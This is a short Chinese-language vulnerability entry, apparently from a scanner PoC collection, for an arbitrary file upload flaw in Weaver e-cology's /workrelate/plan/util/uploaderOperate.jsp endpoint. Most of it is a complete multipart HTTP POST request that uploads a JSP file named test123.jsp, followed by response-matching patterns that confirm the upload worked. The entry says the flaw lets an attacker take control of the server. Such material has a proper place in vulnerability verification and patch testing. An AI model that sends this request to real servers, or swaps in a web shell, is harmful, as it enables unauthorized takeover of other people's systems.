﻿# 泛微 e-cology uploaderOperate.jsp 存在文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：上海泛微网络科技股份有限公司的e-cology存在文件上传漏洞，攻击者利用该漏洞可以获取服务器权限。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=5bade36e1ef037ba47f545fe80bed819

--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="secId"; filename=""

1
--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="Filedata"; filename="test123.jsp"

dude
--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="plandetailid"; filename=""

1
--5bade36e1ef037ba47f545fe80bed819--
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?(?:btn_wh|test123.jsp)).*?$

> 上传文件定位：

> 验证文件来源：泛微 E-cology uploaderOperate.jsp 存在文件上传漏洞.poc
